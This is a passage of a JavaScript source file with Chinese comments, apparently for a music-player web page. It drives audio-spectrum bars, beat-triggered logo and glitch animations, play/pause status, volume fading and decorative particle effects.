            const bar = document.createElement('div');
            bar.className = 'spectrum-bar';
            bar.style.left = (i * (100 / barCount)) + '%';
            bar.style.height = '0px'; // 初始高度为0
            bar.style.width = barWidth + 'px'; // 设置频谱条宽度
            
            // 根据性能档位决定是否创建二进制数字容器
            if (config.enableBinaryDigits) {
                // 创建二进制数字容器
                const binaryDigits = document.createElement('div');
                binaryDigits.className = 'binary-digits';
                
                // 手机端中档位：添加特殊类以加宽二进制字符
                if (isMobile && performanceLevel === 'medium') {
                    binaryDigits.classList.add('mobile-medium-digits');
                }
                
                // 生成随机二进制字符串
                let binaryString = '';
                const digitCount = Math.floor(Math.random() * 12) + 8; // 增加数字数量
                for (let j = 0; j < digitCount; j++) {
                    binaryString += Math.random() > 0.5 ? '1' : '0';
                }
                binaryDigits.textContent = binaryString;
                
                bar.appendChild(binaryDigits);
            }
            spectrumContainer.appendChild(bar);
            spectrumBars.push(bar);
        }
    }
}


// 音频可视化和故障效果
function createAudioVisualEffects() {
    if (!analyser || !isPlaying) {
        // 如果不在播放状态，立即返回，不再执行
        return;
    }
    
    analyser.getByteFrequencyData(dataArray);
    
    // 发送数据给Web Worker处理
    if (isWorkerSupported && spectrumWorker) {
        spectrumWorker.postMessage({
            type: 'spectrumData',
            data: Array.from(dataArray)
        });
    }
    
    const sampleRate = audioContext.sampleRate;
    const dataStreams = document.getElementById('dataStreams');
    const logoContainer = document.getElementById('logoContainer');
    const logo = document.getElementById('logo');
    
    // 基础轻微抖动 - 根据性能档位和播放状态决定
    const config = getPerformanceConfig();
    if (isPlaying && config.enableDataStreamGlitch) {
        dataStreams.classList.remove('glitch-beat');
        dataStreams.classList.add('glitch-subtle');
    } else {
        dataStreams.classList.remove('glitch-subtle', 'glitch-beat');
    }
    
    // 检测重beats/普通beats（复用现有检测）
    const isHeavyBeat = detectHeavyBeat();
    const isBeat = detectBeat();
    
    // 根据性能档位决定是否启用Logo Beats效果
    
    // 重beats触发（优先级更高）
    if (isHeavyBeat && !isInHeavyBeat && config.enableLogoBeats) {
        isInHeavyBeat = true;
        
        // 添加重beats状态
        logoContainer.classList.add('heavy-beats');
        logoContainer.classList.add('activity');
        
        // 创建声波光环
        createWaveRing();
        
        // 创建增强拖影效果
        const rotations = [-12, -8, -4, 0, 4, 8, 12];
        rotations.forEach((rot, index) => {
            setTimeout(() => createTrail(rot), index * 20);
        });
        
        // 重置重beats状态（缩短到200ms以适应更快的节奏）
        setTimeout(() => {
            isInHeavyBeat = false;
            logoContainer.classList.remove('heavy-beats');
            logoContainer.classList.remove('activity');
        }, 200);
        
    } 
    // 普通beats触发（当没有重beats时）
    else if (isBeat && !isInBeat && !isInHeavyBeat && config.enableLogoBeats) {
        isInBeat = true;
        
        // 添加activity状态到logo容器
        logoContainer.classList.add('activity');
        
        // 触发放大旋转动画
        logo.style.animation = 'beatScale 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards';
        
        // 创建普通拖影
        const rotations = [-8, -4, 0, 4, 8];
        rotations.forEach((rot, index) => {
            setTimeout(() => createTrail(rot), index * 30);
        });
        
        // 创建脉冲光环
        createBeatPulse(1);
        
        // 重置beat状态
        setTimeout(() => {
            isInBeat = false;
            logo.style.animation = '';
            logoContainer.classList.remove('activity');
        }, 400);
        
        // 数据流beat效果 - 根据性能档位决定
        if (config.enableDataStreamGlitch) {
            dataStreams.classList.remove('glitch-subtle');
            dataStreams.classList.add('glitch-beat');
            
            // 0.25秒后恢复基础抖动
            setTimeout(() => {
                if (isPlaying) {
                    dataStreams.classList.remove('glitch-beat');
                    dataStreams.classList.add('glitch-subtle');
                }
            }, 250);
        }
    }
    
    // 数据流同步：按性能档位控制
    if (isEasterEggActive) {
        // 档位化参数：柔光半径/时长、高亮强度（可在CSS变量中再微调）
        if (performanceLevel === 'low') {
            // 低档位：也有轻柔光，范围较小、周期较短，瞬时高亮强度较低
            dataStreams.style.setProperty('--egg-glow-radius', '80px');
            dataStreams.style.setProperty('--egg-glow-filter-blur', '10px');
            dataStreams.style.setProperty('--egg-glow-opacity', '0.16');
            dataStreams.style.setProperty('--egg-glow-duration', '1.1s');
            dataStreams.style.setProperty('--egg-highlight-brightness', '1.35');
            dataStreams.style.setProperty('--egg-highlight-saturate', '1.2');
            dataStreams.classList.add('egg-glow');

            // 低档位：仅重Beats触发瞬时高亮
            if (isHeavyBeat) {
                dataStreams.classList.remove('egg-highlight');
                dataStreams.offsetWidth;
                dataStreams.classList.add('egg-highlight');
                setTimeout(() => { dataStreams.classList.remove('egg-highlight'); }, 200);
            }
        } else if (performanceLevel === 'medium') {
            // 中档位：柔光更大更久，高亮更亮，但只在重Beats触发
            dataStreams.style.setProperty('--egg-glow-radius', '140px');
            dataStreams.style.setProperty('--egg-glow-filter-blur', '18px');
            dataStreams.style.setProperty('--egg-glow-opacity', '0.20');
            dataStreams.style.setProperty('--egg-glow-duration', '1.6s');
            dataStreams.style.setProperty('--egg-highlight-brightness', '1.75');
            dataStreams.style.setProperty('--egg-highlight-saturate', '1.45');
            dataStreams.classList.add('egg-glow');

            if (isHeavyBeat) {
                dataStreams.classList.remove('egg-highlight');
                dataStreams.offsetWidth;
                dataStreams.classList.add('egg-highlight');
                setTimeout(() => { dataStreams.classList.remove('egg-highlight'); }, 180);
            }
        } else {
            // 高档位：柔光范围最大、持续更久，高亮最明显，普通与重Beats都触发
            dataStreams.style.setProperty('--egg-glow-radius', '200px');
            dataStreams.style.setProperty('--egg-glow-filter-blur', '22px');
            dataStreams.style.setProperty('--egg-glow-opacity', '0.24');
            dataStreams.style.setProperty('--egg-glow-duration', '2.0s');
            dataStreams.style.setProperty('--egg-highlight-brightness', '1.95');
            dataStreams.style.setProperty('--egg-highlight-saturate', '1.6');
            dataStreams.classList.add('egg-glow');

            if (isHeavyBeat || isBeat) {
                dataStreams.classList.remove('egg-highlight');
                dataStreams.offsetWidth;
                dataStreams.classList.add('egg-highlight');
                setTimeout(() => { dataStreams.classList.remove('egg-highlight'); }, 140);
            }
        }
    } else {
        // 非页恢复原样
        dataStreams.classList.remove('egg-glow', 'egg-highlight');
        // 清理自定义变量，避免影响主页
        dataStreams.style.removeProperty('--egg-glow-radius');
        dataStreams.style.removeProperty('--egg-glow-filter-blur');
        dataStreams.style.removeProperty('--egg-glow-opacity');
        dataStreams.style.removeProperty('--egg-glow-duration');
        dataStreams.style.removeProperty('--egg-highlight-brightness');
        dataStreams.style.removeProperty('--egg-highlight-saturate');
    }

    // 应用音频驱动的持续抖动效果
    applyAudioDrivenGlitch();
    
    // 更新频谱显示
    updateBinarySpectrum(dataArray);
    
    // 更新进度条
    updateProgress();
    
    // 继续动画循环 - 只在播放时继续
    if (isPlaying) {
        requestAnimationFrame(createAudioVisualEffects);
    }
}

// 基于Web Worker结果的频谱更新
function updateBinarySpectrumFromWorker(dataArray, workerData) {
    if (!spectrumBars.length) return;
    
    const barCount = spectrumBars.length;
    const usableDataLength = Math.floor(dataArray.length * 0.85);
    const dataStep = Math.floor(usableDataLength / barCount);
    
    // 使用Web Worker计算的频段能量
    const bandEnergies = workerData.spectrumFeatures.bandEnergies;
    
    for (let i = 0; i < barCount; i++) {
        const dataIndex = i * dataStep;
        const value = dataArray[dataIndex] || 0;
        
        // 根据频段位置选择对应的能量值
        let bandEnergy = 0;
        const position = i / barCount;
        
        if (position < 0.2) {
            bandEnergy = bandEnergies.low;
        } else if (position < 0.4) {
            bandEnergy = bandEnergies.midLow;
        } else if (position < 0.6) {
            bandEnergy = bandEnergies.mid;
        } else if (position < 0.8) {
            bandEnergy = bandEnergies.midHigh;
        } else {
            bandEnergy = bandEnergies.high;
        }
        
        // 结合原始数据和频段能量
        const combinedValue = (value / 255) * 0.7 + bandEnergy * 0.3;
        const height = Math.max(5, combinedValue * 100);
        const bar = spectrumBars[i];
        
        bar.classList.remove('stopping');
        bar.style.height = height + 'px';
        
        // 根据性能档位决定是否启用Bar高亮和二进制数字更新
        const config = getPerformanceConfig();
        if (config.enableSpectrumHighlight) {
            // 使用Web Worker的Beat检测结果和能量值
            const isActive = workerData.beat.detected || workerData.heavyBeat.detected;
            const energyThreshold = 100;
            
            if (isActive && value > energyThreshold) {
                bar.classList.add('active');
            } else if (value > 120) { // 即使没有Beat，高能量也激活
                bar.classList.add('active');
            } else {
                bar.classList.remove('active');
            }
            
            // 随机更新二进制数字
            if (config.enableBinaryDigits && Math.random() > 0.92) {
                const binaryDigits = bar.querySelector('.binary-digits');
                if (binaryDigits) {
                    let newBinary = '';
                    const digitCount = Math.floor(Math.random() * 12) + 8;
                    for (let j = 0; j < digitCount; j++) {
                        newBinary += Math.random() > 0.5 ? '1' : '0';
                    }
                    binaryDigits.textContent = newBinary;
                }
            }
        }
    }
}

// 更新二进制频谱显示
function updateBinarySpectrum(dataArray) {
    if (!spectrumBars.length) return;
    
    const barCount = spectrumBars.length;
    const usableDataLength = Math.floor(dataArray.length * 0.85); // 只使用前85%
    const dataStep = Math.floor(usableDataLength / barCount);
    
    for (let i = 0; i < barCount; i++) {
        const dataIndex = i * dataStep;
        const value = dataArray[dataIndex] || 0;
        
        // 映射到高度 (5px 到 100px) - 增加高度范围
        const height = Math.max(5, (value / 255) * 100);
        const bar = spectrumBars[i];
        
        bar.classList.remove('stopping'); // 移除滑落类
        bar.style.height = height + 'px';
        
        // 根据性能档位决定是否启用Bar高亮和二进制数字更新
        const config = getPerformanceConfig();
        if (config.enableSpectrumHighlight) {
            // 高能量时激活特效
            if (value > 120) { // 降低阈值，更容易触发
                bar.classList.add('active');
            } else {
                bar.classList.remove('active');
            }
            
            // 随机更新二进制数字 (稍微提高更新频率)
            if (config.enableBinaryDigits && Math.random() > 0.92) { // 从0.95改为0.92
                const binaryDigits = bar.querySelector('.binary-digits');
                if (binaryDigits) {
                    let newBinary = '';
                    const digitCount = Math.floor(Math.random() * 12) + 8;
                    for (let j = 0; j < digitCount; j++) {
                        newBinary += Math.random() > 0.5 ? '1' : '0';
                    }
                    binaryDigits.textContent = newBinary;
                }
            }
        }
    }
}

// 停止故障效果
function stopGlitchEffect() {
    const dataStreams = document.getElementById('dataStreams');
    
    // 强制移除所有抖动相关的类
    dataStreams.classList.remove('glitch-subtle', 'glitch-beat');
    
    
    // 频谱滑落效果
    spectrumBars.forEach((bar, index) => {
        bar.classList.add('stopping');
        bar.classList.remove('active');
        
        // 分批次滑落，创造波浪效果
        setTimeout(() => {
            bar.style.height = '0px';
            
            // 清空二进制数字
            setTimeout(() => {
                const binaryDigits = bar.querySelector('.binary-digits');
                if (binaryDigits) {
                    binaryDigits.textContent = '';
                }
            }, 400);
            
        }, index * 20);
    });
}

// 删除原有的 showAudioStatus 函数
// 添加新的状态管理函数
function updateAudioStatus(state) {
    const statusElement = document.getElementById('audioStatus');
    
    statusElement.classList.remove('blink', 'show', 'hidden');
    
    switch(state) {
        case 'initial':
            statusElement.textContent = '点击 LOGO 播放 BGM';
            statusElement.classList.add('blink');
            break;
            
        case 'playing':
            statusElement.classList.add('hidden');
            break;
            
        case 'paused':
            statusElement.textContent = '点击 LOGO 继续播放';
            statusElement.classList.add('show');
            break;
            
        default:
            statusElement.classList.add('hidden');
    }
}

// Logo点击事件处理
function handleLogoClick() {
    const audio = document.getElementById('bgmAudio');
    const logoContainer = document.getElementById('logoContainer');
    const logo = document.getElementById('logo');
    
    if (!isPlaying) {
        // 首次播放时初始化音频上下文
        if (!audioContext) {
            if (!initAudioContext()) {
                updateAudioStatus('initial');
                return;
            }
        }
        
        // 恢复音频上下文（某些浏览器需要用户交互后才能播放）
        if (audioContext.state === 'suspended') {
            audioContext.resume();
        }
        
        // 播放音频
        audio.play().then(() => {
            isPlaying = true;
            logoContainer.classList.add('playing');
            updateAudioStatus('playing');
            
            // 确保清理之前的效果
            const dataStreams = document.getElementById('dataStreams');
            dataStreams.classList.remove('glitch-subtle', 'glitch-beat');
            
            // 开始音频可视化效果
            createAudioVisualEffects();
            
        }).catch(error => {
            updateAudioStatus('initial');
        });
        
    } else {
        // 先设置状态为false，停止动画循环
        isPlaying = false;
        
        // 暂停音频
        audio.pause();
        logoContainer.classList.remove('playing', 'activity', 'heavy-beats');
        updateAudioStatus('paused');
        
        // 重置logo样式
        logo.style.transform = '';
        logo.style.animation = '';
        
        // 重置beats检测状态
        isInBeat = false;
        isInHeavyBeat = false;
        heavyBeatBuffer = [];
        
        // 重置persistentGlow状态
        resetBounceHeight();
        
        // 延迟一帧后停止故障效果，确保动画循环已停止
        requestAnimationFrame(() => {
            stopGlitchEffect();
            
            // 停止Web Worker
            if (isWorkerSupported && spectrumWorker) {
                spectrumWorker.postMessage({ type: 'stop' });
            }
        });
    }
}

// 音频结束时的处理
function handleAudioEnd() {
    const logoContainer = document.getElementById('logoContainer');
    const logo = document.getElementById('logo');
    
    // 先设置状态
    isPlaying = false;
    logoContainer.classList.remove('playing', 'activity', 'heavy-beats');
    
    // 重置logo样式
    logo.style.transform = '';
    logo.style.animation = '';
    
    // 重置beats检测状态
    isInBeat = false;
    isInHeavyBeat = false;
    heavyBeatBuffer = [];
    
    // 重置进度条
    if (progressRect) {
        progressRect.setAttribute('width', '0');
    }
    
    // 重置persistentGlow状态
    resetBounceHeight();
    
    // 延迟一帧后清理效果
    requestAnimationFrame(() => {
        stopGlitchEffect();
    });
    
    updateAudioStatus('initial');
}

// 窗口大小变化时重新创建频谱
let resizeTimeout;
window.addEventListener('resize', () => {
    clearTimeout(resizeTimeout);
    resizeTimeout = setTimeout(() => {
        // 更新移动端检测
        isMobile = window.innerWidth < 768;
        createBinarySpectrum();
        
        // 更新性能档位控件位置
        checkNavPosition();
    }, 300);
});

// 页面可见性变化时调整音量
document.addEventListener('visibilitychange', function() {
    const audio = document.getElementById('bgmAudio');
    
    if (document.hidden && isPlaying) {
        // 页面失焦时，音量渐降到15%
        const startVolume = audio.volume;
        const targetVolume = 0.15;
        const duration = 600; // 600ms渐变
        const steps = 20;
        const volumeStep = (startVolume - targetVolume) / steps;
        const timeStep = duration / steps;
        
        let currentStep = 0;
        const fadeInterval = setInterval(() => {
            currentStep++;
            audio.volume = Math.max(targetVolume, startVolume - (volumeStep * currentStep));
            
            if (currentStep >= steps) {
                clearInterval(fadeInterval);
                audio.volume = targetVolume;
            }
        }, timeStep);
        
    } else if (!document.hidden && isPlaying) {
        // 页面重新聚焦时，音量渐升到100%
        const startVolume = audio.volume;
        const targetVolume = 1.0; // 恢复到默认的100%
        const duration = 350;
        const steps = 20;
        const volumeStep = (targetVolume - startVolume) / steps;
        const timeStep = duration / steps;
        
        let currentStep = 0;
        const fadeInterval = setInterval(() => {
            currentStep++;
            audio.volume = Math.min(targetVolume, startVolume + (volumeStep * currentStep));
            
            if (currentStep >= steps) {
                clearInterval(fadeInterval);
                audio.volume = targetVolume;
            }
        }, timeStep);
    }
});

// 创建科技蓝颗粒迸发效果
function createTechParticleBurst() {
    const currentTime = Date.now();
    
    // 防止重复触发和频繁触发
    if (document.querySelector('.tech-particle-burst') || (currentTime - lastBurstTime) < burstCooldown) {
        return;
    }
    
    lastBurstTime = currentTime;
    
    const burstContainer = document.createElement('div');
    burstContainer.className = 'tech-particle-burst';
    document.body.appendChild(burstContainer);
    
    // 获取footer位置
    const footer = document.getElementById('mainFooter');
    const footerRect = footer.getBoundingClientRect();
    const footerTop = footerRect.top;
    const footerLeft = footerRect.left;
    const footerWidth = footerRect.width;
    
    // 根据性能档位调整颗粒数量
    const config = getPerformanceConfig();
    const particleCount = config.particleCount;
    
    for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'tech-particle';
        
        // 随机位置（在footer上边框附近）
        const randomX = footerLeft + Math.random() * footerWidth;
        const randomY = footerTop + Math.random() * 8; // 在footer上边框8px范围内
        
        particle.style.left = randomX + 'px';
        particle.style.top = randomY + 'px';
        
        // 随机延迟，创造更自然的迸发效果
        particle.style.animationDelay = Math.random() * 0.4 + 's';
        
        // 随机大小变化
        const size = 2 + Math.random() * 3; // 2-5px
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        
        // 随机颜色变化（科技蓝的变体）
        const colorVariations = [
            '#00e4ff',
            '#00a2ff', 
            '#66ccff',
            '#0099ff',
            '#007acc',
            '#4a90e2'
        ];
        const randomColor = colorVariations[Math.floor(Math.random() * colorVariations.length)];
        particle.style.background = randomColor;
        particle.style.boxShadow = `0 0 8px ${randomColor}, 0 0 16px ${randomColor}80`;
        
        // 随机水平偏移，增加迸发的自然感
        const horizontalOffset = (Math.random() - 0.5) * 20;
        particle.style.setProperty('--horizontal-offset', horizontalOffset + 'px');
        
        burstContainer.appendChild(particle);
    }
    
    // 1.5秒后移除容器
    setTimeout(() => {
        if (burstContainer.parentNode) {
            burstContainer.parentNode.removeChild(burstContainer);
        }
    }, 1500);
}

// 页面持续粒子效果相关变量
let easterEggParticleInterval = null;
let easterEggParticleContainer = null;

// 启动页面的持续粒子游离效果
function startEasterEggParticleEffect() {
    // 如果已经在运行，先停止
    stopEasterEggParticleEffect();
    
    // 创建粒子容器
    easterEggParticleContainer = document.createElement('div');
    easterEggParticleContainer.className = 'easter-egg-particle-container';
    easterEggParticleContainer.style.cssText = `
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1002;
        overflow: hidden;
    `;
    document.body.appendChild(easterEggParticleContainer);
    
    // 每0.8秒创建一个粒子，创造持续游离效果
    easterEggParticleInterval = setInterval(() => {
        createEasterEggParticle();
    }, 800);
}

// 停止页面的持续粒子迸发效果
function stopEasterEggParticleEffect() {
    if (easterEggParticleInterval) {
        clearInterval(easterEggParticleInterval);
        easterEggParticleInterval = null;
    }
    
    if (easterEggParticleContainer) {
        if (easterEggParticleContainer.parentNode) {
            easterEggParticleContainer.parentNode.removeChild(easterEggParticleContainer);
        }
        easterEggParticleContainer = null;
    }
}

// 创建页面的单个粒子游离效果
function createEasterEggParticle() {
    if (!easterEggParticleContainer) return;
    
    const particle = document.createElement('div');
    particle.className = 'easter-egg-particle';
    
    // 从底部随机位置开始
    const randomX = Math.random() * window.innerWidth;
    const randomY = window.innerHeight - Math.random() * 20; // 从底部20px范围内开始
    
    particle.style.left = randomX + 'px';
    particle.style.top = randomY + 'px';
    
    // 设置水平偏移
    const horizontalOffset = (Math.random() - 0.5) * 40; // -20px 到 20px
    particle.style.setProperty('--horizontal-offset', horizontalOffset + 'px');
    
    // 粒子大小
    const size = 1.5 + Math.random() * 2.5; // 1.5-4px
    particle.style.width = size + 'px';
    particle.style.height = size + 'px';
    
    // 科技蓝颜色变体
    const colorVariations = [
        '#00e4ff',
        '#00a2ff', 
        '#66ccff',
        '#0099ff',
        '#33bbff',
        '#00ccff'
    ];
    const randomColor = colorVariations[Math.floor(Math.random() * colorVariations.length)];
    particle.style.background = randomColor;
    particle.style.boxShadow = `0 0 4px ${randomColor}, 0 0 8px rgba(0, 228, 255, 0.3)`;
    
    // 使用游离动画
    particle.style.animation = 'easterEggParticleFloat 6s ease-out forwards';
    
    easterEggParticleContainer.appendChild(particle);
    
    // 6秒后移除粒子
    setTimeout(() => {
        if (particle.parentNode) {
            particle.parentNode.removeChild(particle);
        }
    }, 6000);
}